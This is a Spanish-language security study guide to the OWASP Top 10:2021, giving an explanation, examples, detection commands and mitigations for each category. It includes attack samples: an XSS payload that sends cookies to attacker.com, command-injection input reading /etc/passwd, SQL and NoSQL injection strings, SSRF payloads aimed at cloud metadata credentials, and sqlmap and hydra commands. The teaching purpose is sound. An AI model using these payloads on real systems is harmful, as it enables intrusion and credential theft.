# OWASP Top 10 — 2021

> El **OWASP Top 10** es el estándar de referencia para la seguridad de aplicaciones web. Publicado por la *Open Web Application Security Project*, lista las 10 categorías de riesgo más críticas basándose en datos reales de la industria.

**Versión cubierta:** OWASP Top 10:2021 (la más reciente)

---

## Tabla de contenidos

| ID | Nombre | Cambio respecto a 2017 |
|----|--------|----------------------|
| [A01](#a01--broken-access-control) | Broken Access Control | ⬆️ Sube del #5 al #1 |
| [A02](#a02--cryptographic-failures) | Cryptographic Failures | ⬆️ Sube del #3 al #2 |
| [A03](#a03--injection) | Injection | ⬇️ Baja del #1 al #3 |
| [A04](#a04--insecure-design) | Insecure Design | 🆕 Nueva categoría |
| [A05](#a05--security-misconfiguration) | Security Misconfiguration | ⬆️ Sube del #6 al #5 |
| [A06](#a06--vulnerable-and-outdated-components) | Vulnerable and Outdated Components | ⬆️ Sube del #9 al #6 |
| [A07](#a07--identification-and-authentication-failures) | Identification and Authentication Failures | ⬇️ Baja del #2 al #7 |
| [A08](#a08--software-and-data-integrity-failures) | Software and Data Integrity Failures | 🆕 Nueva categoría |
| [A09](#a09--security-logging-and-monitoring-failures) | Security Logging and Monitoring Failures | ⬆️ Sube del #10 al #9 |
| [A10](#a10--server-side-request-forgery-ssrf) | Server-Side Request Forgery (SSRF) | 🆕 Nueva entrada |

---

## A01 — Broken Access Control

> **Riesgo:** 🔴 CRÍTICO | **Incidencia:** 94% de las aplicaciones testadas

### ¿Qué es?

El control de acceso define qué puede hacer cada usuario dentro de una aplicación. Cuando está roto, los usuarios pueden actuar fuera de sus permisos previstos: acceder a datos de otros usuarios, modificar información sin autorización o realizar acciones de administrador.

### Tipos de fallos más comunes

**1. IDOR — Insecure Direct Object Reference**
Acceder a objetos de otros usuarios cambiando un ID en la URL.

```http
# Usuario con ID 123 accede a su perfil
GET /api/users/123/profile

# Cambia el 123 por 124 y accede al perfil de otro usuario
GET /api/users/124/profile   ← Sin validar si 123 puede ver a 124
```

**2. Escalada de privilegios vertical**
Un usuario normal accede a funcionalidad de administrador.

```http
# Endpoint de admin sin protección
GET /admin/delete-user?id=456
# Si el servidor no comprueba si el usuario es admin, cualquiera puede borrarlo
```

**3. Manipulación de tokens JWT**
Modificar el payload de un JWT sin validar la firma.

```bash
# JWT con payload: {"role": "user", "id": 123}
# Atacante lo decodifica, cambia "user" por "admin" y lo reenvía
# Si el servidor no valida la firma, acepta el token modificado
```

**4. CORS mal configurado**
```javascript
// Config peligrosa: acepta cualquier origen
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Cómo detectarlo

```bash
# 1. Autenticarse como usuario A, guardar el token
# 2. Acceder a recursos de usuario B usando el token de A
curl -H "Authorization: Bearer tokenDeA" \
     https://target.com/api/users/idDeB/documents

# 3. Probar endpoints de admin sin autenticar
curl https://target.com/admin/users
curl https://target.com/api/admin/settings
```

### Mitigación

- **Denegar por defecto:** todo acceso está prohibido salvo que esté explícitamente permitido.
- Validar permisos **en el servidor** en cada petición (nunca solo en el cliente).
- Registrar y alertar sobre fallos de control de acceso.
- Deshabilitar listado de directorios en servidores web.
- Implementar tests automatizados de control de acceso.

---

## A02 — Cryptographic Failures

> **Riesgo:** 🔴 CRÍTICO | Anteriormente llamado "Sensitive Data Exposure"

### ¿Qué es?

Fallos en la criptografía que protege los datos, tanto en tránsito como en reposo. Puede llevar a la exposición de datos sensibles: contraseñas, tarjetas de crédito, datos médicos, etc.

### Tipos de fallos más comunes

**1. Algoritmos débiles o anticuados**

```
❌ Usar: MD5, SHA-1, DES, RC4
✓ Usar: SHA-256, SHA-3, AES-256, ChaCha20
```

**2. Contraseñas almacenadas en texto plano o con hash débil**

```sql
-- MAL: contraseña en MD5 sin salt (rompible con tablas rainbow)
SELECT * FROM users WHERE password = MD5('micontrasena');

-- BIEN: bcrypt, Argon2, scrypt
$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewYpfQN
```

**3. HTTP en lugar de HTTPS**
Transmitir datos sensibles sin cifrar permite ataques Man-in-the-Middle.

**4. Claves hardcodeadas en el código fuente**

```python
# MAL: clave en el código
SECRET_KEY = "mi_clave_supersecreta_123"
API_KEY = "ghp_AbCdEfGhIjKlMnOpQrStUvWxYz"

# BIEN: cargar desde variables de entorno
import os
SECRET_KEY = os.getenv("SECRET_KEY")
```

### Cómo detectarlo

```bash
# Buscar claves hardcodeadas en repositorios
grep -r "password\|secret\|api_key\|token" . --include="*.py" --include="*.js"

# Comprobar que el sitio usa HTTPS
curl -I http://target.com  # ¿Redirige a HTTPS?

# Ver qué algoritmos de cifrado ofrece un servidor
nmap --script=ssl-enum-ciphers -p 443 target.com
```

### Mitigación

- Usar **HTTPS** en toda la aplicación (HSTS).
- Almacenar contraseñas con **bcrypt, Argon2 o scrypt** (con salt).
- No usar MD5 ni SHA-1 para datos sensibles.
- Usar variables de entorno o gestores de secretos (Vault, AWS Secrets Manager).
- Deshabilitar caché en respuestas que contengan datos sensibles.

---

## A03 — Injection

> **Riesgo:** 🔴 CRÍTICO | Fue el #1 durante más de una década

### ¿Qué es?

Ocurre cuando datos no confiables son enviados a un intérprete (SQL, comandos del SO, LDAP, etc.) como parte de una consulta o comando. El intérprete ejecuta los datos como instrucciones.

### Tipos principales

**1. SQL Injection**

```sql
-- Consulta original
SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT';

-- Payload del atacante en el campo username
' OR '1'='1'--

-- Consulta resultante (devuelve todos los usuarios)
SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '';
```

**2. Command Injection (OS Injection)**

```python
# Código vulnerable: ejecuta un ping a la IP introducida por el usuario
import os
ip = input("IP a pingear: ")
os.system(f"ping -c 1 {ip}")

# El atacante introduce: 127.0.0.1; cat /etc/passwd
# Se ejecuta: ping -c 1 127.0.0.1; cat /etc/passwd
```

**3. XSS — Cross-Site Scripting**

```html
<!-- Aplicación vulnerable que muestra el nombre del usuario sin sanitizar -->
<p>Bienvenido, <?php echo $_GET['nombre']; ?></p>

<!-- Payload del atacante en el parámetro "nombre" -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**4. NoSQL Injection**

```javascript
// Vulnerable: MongoDB
db.users.find({ username: req.body.username, password: req.body.password });

// Payload: { "username": {"$gt": ""}, "password": {"$gt": ""} }
// Devuelve el primer usuario de la BD sin conocer contraseña
```

### Cómo detectarlo

```bash
# SQLi básico en parámetro
curl "https://target.com/user?id=1'"
curl "https://target.com/user?id=1 OR 1=1--"

# Con sqlmap (automático)
sqlmap -u "https://target.com/user?id=1" --dbs

# XSS básico
curl "https://target.com/search?q=<script>alert(1)</script>"
```

### Mitigación

- **Consultas parametrizadas** (prepared statements) para SQL.
- Validar y sanitizar todas las entradas del usuario.
- Usar **ORM** (SQLAlchemy, Hibernate) en lugar de SQL crudo.
- Implementar **Content Security Policy (CSP)** para XSS.
- Principio de **mínimo privilegio** en cuentas de base de datos.

---

## A04 — Insecure Design

> **Riesgo:** 🟠 HIGH | 🆕 Nueva en 2021

### ¿Qué es?

Diferencia importante: **no es un error de implementación**, sino un fallo en el diseño de la arquitectura. El código puede estar correctamente escrito pero la lógica de negocio tiene agujeros que un atacante puede explotar.

### Ejemplos reales

**1. Recuperación de contraseña insegura**
```
❌ Diseño inseguro:
   "¿Cuál es el nombre de tu primera mascota?"
   → Respuesta predecible, investigable desde redes sociales

✓ Diseño seguro:
   Enlace de reset con token de un solo uso y expiración de 15 minutos
   enviado al email verificado
```

**2. Ausencia de límite de intentos (Rate Limiting)**
```
❌ Sin rate limiting:
   Un atacante puede probar 1.000.000 contraseñas en pocos minutos

✓ Con rate limiting:
   Tras 5 intentos fallidos, bloquear la cuenta 15 minutos
```

**3. Lógica de negocio rota**
```
Tienda online: el precio del producto se envía desde el cliente
❌ El servidor acepta el precio que envía el cliente
   → Comprar un artículo de 500€ por 1€ modificando la petición

✓ El servidor calcula el precio internamente a partir del ID del producto
```

### Mitigación

- **Modelado de amenazas** (Threat Modeling) en la fase de diseño.
- Principio de mínimo privilegio por defecto.
- Validar la lógica de negocio en el servidor, nunca en el cliente.
- Implementar **límites y controles** desde el diseño inicial.
- Revisar diseños con expertos en seguridad antes de implementar.

---

## A05 — Security Misconfiguration

> **Riesgo:** 🟠 HIGH | Incidencia muy alta: 90% de aplicaciones testadas

### ¿Qué es?

Configuraciones incorrectas o por defecto que dejan el sistema expuesto. Es el fallo más común porque afecta a todos los niveles: servidor, framework, base de datos, cloud, contenedor...

### Ejemplos comunes

**1. Credenciales por defecto**
```
admin/admin, admin/password, root/root
→ Siempre probar en paneles de admin, bases de datos, routers
```

**2. Mensajes de error detallados en producción**
```python
# MAL: muestra stack trace completo al usuario
DEBUG = True  # En Django en producción

# Error mostrado:
# File "/app/views.py", line 42, in get_user
#   user = User.objects.get(id=user_id)
# DoesNotExist: User matching query does not exist.
# → Revela estructura interna, rutas, versiones
```

**3. Servicios innecesarios expuestos**
```bash
# Base de datos MongoDB sin autenticación expuesta a internet
nmap -p 27017 target.com  → open
mongo target.com          → Acceso sin contraseña a todos los datos
```

**4. Cabeceras de seguridad HTTP ausentes**
```http
# Cabeceras importantes que deben estar presentes:
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### Cómo detectarlo

```bash
# Ver cabeceras de seguridad HTTP
curl -I https://target.com

# Buscar paneles de admin expuestos
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Comprobar versiones de software expuestas
nmap -sV 192.168.1.41
```

### Mitigación

- **Hardening** de todos los componentes (SO, servidor web, BD, framework).
- Eliminar funcionalidades, páginas y servicios innecesarios.
- Cambiar todas las credenciales por defecto.
- Revisar y aplicar **Security Headers**.
- Automatizar con IaC (Infrastructure as Code) para asegurar configuraciones reproducibles.

---

## A06 — Vulnerable and Outdated Components

> **Riesgo:** 🟠 HIGH | Fue #9 en 2017, ahora #6

### ¿Qué es?

Usar librerías, frameworks u otros componentes con vulnerabilidades conocidas. Es especialmente peligroso porque el código vulnerable no es el tuyo, pero te afecta igual.

### Ejemplos reales

**Log4Shell (CVE-2021-44228)**
```xml
<!-- Log4j 2.14.1 en el proyecto (pom.xml de Maven) -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>  ← VULNERABLE
</dependency>
<!-- Versión segura: 2.17.1 o superior -->
```

**Struts2 CVE-2017-5638**
```
→ El framework Apache Struts2 (versión 2.3.x, 2.5.x) tenía una RCE
→ Explotado en la brecha de Equifax (147 millones de afectados)
→ El parche existía 2 meses antes del ataque. No lo habían aplicado.
```

### Cómo detectarlo

```bash
# Python: auditar dependencias
pip audit
safety check -r requirements.txt

# Node.js
npm audit
snyk test

# Java Maven
mvn dependency-check:check

# Ver librerías de un sistema Linux
dpkg -l | grep <paquete>
apt list --installed
```

### Mitigación

- **Inventario** de todos los componentes y sus versiones.
- Suscribirse a alertas de seguridad de las dependencias que usas.
- Usar **Dependabot** (GitHub) o **Snyk** para detección automática.
- Política de actualización periódica (mensual como mínimo).
- Preferir componentes activamente mantenidos.

---

## A07 — Identification and Authentication Failures

> **Riesgo:** 🟠 HIGH | Antes llamado "Broken Authentication"

### ¿Qué es?

Fallos en la identificación de usuarios o en la gestión de sesiones que permiten a un atacante comprometer contraseñas, claves o tokens de sesión, o explotar otros fallos de implementación para usurpar identidades.

### Ejemplos comunes

**1. Contraseñas débiles permitidas**
```
❌ El sistema permite: "123456", "password", "qwerty"
✓ Validar contra lista de contraseñas comunes (HIBP API)
```

**2. Ausencia de MFA**
```
Un atacante con credenciales robadas puede entrar directamente.
Con MFA: necesita también el dispositivo físico del usuario.
```

**3. Exposición de session ID en la URL**
```
❌ https://target.com/dashboard?sessionid=abc123
   → El session ID aparece en logs del servidor, historial del navegador, cabecera Referer

✓ Session ID siempre en cookie con flags: HttpOnly, Secure, SameSite
```

**4. Session fixation**
```
1. Atacante obtiene un session ID del servidor
2. Engaña a la víctima para que se autentique con ese session ID
3. El servidor no genera un nuevo session ID tras el login
4. Atacante usa el mismo session ID para acceder autenticado
```

**5. Credential Stuffing**
```bash
# Usar listas de credenciales filtradas (breach databases)
# Herramientas: Hydra, Burp Suite Intruder, ffuf
hydra -L users.txt -P passwords.txt target.com http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

### Mitigación

- Implementar **MFA** (autenticación multifactor).
- No permitir contraseñas débiles o comunes.
- Invalidar el session ID tras el login y tras el logout.
- Implementar **lockout** tras intentos fallidos con alertas.
- Usar gestores de sesión seguros del framework (no implementar los propios).

---

## A08 — Software and Data Integrity Failures

> **Riesgo:** 🟠 HIGH | 🆕 Nueva en 2021

### ¿Qué es?

Fallos que permiten que código o datos sean manipulados sin detección. Incluye ataques a la cadena de suministro (supply chain), pipelines de CI/CD inseguros y deserialización insegura.

### Ejemplos reales

**1. Supply Chain Attack — SolarWinds (2020)**
```
→ Atacantes comprometieron el proceso de build de SolarWinds
→ Inyectaron código malicioso en la actualización oficial del software Orion
→ 18.000+ organizaciones descargaron e instalaron la actualización comprometida
→ Incluidas agencias del gobierno de EE.UU.
→ El código estaba firmado digitalmente con el certificado real de SolarWinds
```

**2. Deserialización insegura (Java)**
```java
// Deserializar datos de una fuente no confiable puede ejecutar código arbitrario
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // ← PELIGROSO si los datos vienen del usuario

// Un atacante puede enviar un objeto serializado malicioso
// que ejecute comandos del sistema al ser deserializado
```

**3. Dependencia de CDN sin verificación de integridad**
```html
<!-- MAL: si el CDN es comprometido, el atacante puede servir su propio JS -->
<script src="https://cdn.example.com/jquery.min.js"></script>

<!-- BIEN: Subresource Integrity (SRI) verifica el hash del archivo -->
<script src="https://cdn.example.com/jquery.min.js"
        integrity="sha384-xBuQ/xzmlsLoJpyjoggmTEz8OWUFM0/RC5BsqoXEyU...=="
        crossorigin="anonymous"></script>
```

### Mitigación

- Verificar **firmas digitales** de paquetes y actualizaciones.
- Usar **Subresource Integrity (SRI)** para recursos externos.
- Revisar cambios en dependencias (lockfiles: `package-lock.json`, `Pipfile.lock`).
- Implementar SAST y análisis de dependencias en el pipeline de CI/CD.
- No deserializar datos de fuentes no confiables.

---

## A09 — Security Logging and Monitoring Failures

> **Riesgo:** 🟡 MEDIUM | Antes "Insufficient Logging & Monitoring"

### ¿Qué es?

Sin logging adecuado, los ataques no se detectan, no se investigan y no se contienen. El tiempo medio de detección de una brecha de seguridad en el mundo real es de **207 días** (IBM Cost of a Data Breach Report 2023).

### Qué debe registrarse

```python
# Eventos que siempre deben quedar en log:
# ✓ Intentos de login (exitosos y fallidos)
# ✓ Cambios de contraseña o email
# ✓ Intentos de acceso a recursos no autorizados
# ✓ Operaciones CRUD sobre datos sensibles
# ✓ Errores de validación de inputs
# ✓ Alertas del WAF o IDS

import logging

logging.warning(
    "LOGIN_FAILED user=%s ip=%s attempts=%d",
    username, client_ip, attempt_count
)
```

### Qué NO debe registrarse

```python
# ❌ NUNCA loggear datos sensibles:
logging.info(f"Login attempt: user={username}, password={password}")
logging.debug(f"Token: {jwt_token}")
logging.info(f"Credit card: {card_number}")
```

### Mitigación

- Loggear todos los eventos de autenticación y acceso.
- Centralizar logs en un **SIEM** (Splunk, ELK Stack, Graylog).
- Configurar **alertas** para actividad sospechosa (múltiples fallos de login, acceso fuera de horario).
- Proteger los logs contra modificación (append-only, offsite).
- Definir y practicar un **plan de respuesta a incidentes**.

---

## A10 — Server-Side Request Forgery (SSRF)

> **Riesgo:** 🟠 HIGH | 🆕 Nueva en el Top 10 en 2021

### ¿Qué es?

El SSRF ocurre cuando una aplicación web hace peticiones HTTP a una URL proporcionada por el usuario sin validarla. El atacante puede hacer que el servidor haga peticiones a recursos internos que no deberían ser accesibles desde internet.

### ¿Por qué es tan peligroso?

Desde el servidor comprometido, el atacante puede acceder a:
- **Servicios internos** que no están expuestos (bases de datos, APIs internas)
- **Metadatos de instancias cloud** (AWS: `169.254.169.254`)
- **Archivos del sistema** mediante `file://`

### Ejemplo de explotación

```http
# Funcionalidad legítima: cargar una imagen por URL
POST /api/fetch-image
{"url": "https://example.com/image.png"}

# Payload de SSRF: apuntar al servicio de metadatos de AWS
POST /api/fetch-image
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# Respuesta del servidor: devuelve las credenciales IAM de la instancia
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```

**Acceso a servicios internos:**
```http
# Escanear puertos internos
{"url": "http://192.168.1.1:22"}   → Si responde: SSH interno accesible
{"url": "http://127.0.0.1:6379"}   → Redis sin autenticación
{"url": "http://127.0.0.1:27017"}  → MongoDB interno
```

**Lectura de archivos:**
```http
{"url": "file:///etc/passwd"}
{"url": "file:///etc/shadow"}
```

### Cómo detectarlo

```bash
# Usar un servidor de burp collaborator o interactsh.com para detectar callbacks
# Inyectar tu URL en cualquier campo que acepte URLs:
{"url": "https://tu-servidor.com/ssrf-test"}

# Luego buscar en los logs de tu servidor si recibiste la petición
# Si llega: SSRF confirmado
```

### Mitigación

- **Lista blanca** de URLs/dominios permitidos (no lista negra).
- Deshabilitar redirecciones HTTP en el cliente del servidor.
- **Segmentación de red:** el servidor de aplicación no debe poder acceder a servicios internos.
- Bloquear peticiones a rangos de IPs privadas (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16).
- En AWS: usar IMDSv2 (requiere token previo, no vulnerable a SSRF básico).

---

## Resumen comparativo

| ID | Categoría | Impacto principal | Herramienta de detección |
|----|-----------|-------------------|--------------------------|
| A01 | Broken Access Control | Acceso a datos ajenos | Burp Suite, manual |
| A02 | Cryptographic Failures | Robo de datos sensibles | testssl.sh, ssl-enum-ciphers |
| A03 | Injection | RCE, robo de BD | sqlmap, commix, Burp |
| A04 | Insecure Design | Bypass de lógica negocio | Revisión manual, threat modeling |
| A05 | Security Misconfiguration | Acceso no autorizado | Nmap, nikto, gobuster |
| A06 | Outdated Components | RCE via CVE conocida | npm audit, snyk, trivy |
| A07 | Auth Failures | Robo de cuentas | Hydra, Burp Intruder |
| A08 | Integrity Failures | Ejecución de código malicioso | SAST, análisis de dependencias |
| A09 | Logging Failures | Ataques no detectados | Revisión de logs, SIEM |
| A10 | SSRF | Acceso a red interna | Burp Collaborator, interactsh |

---

## Referencias

- [OWASP Top 10:2021 (oficial)](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Labs gratuitos para practicar cada vulnerabilidad
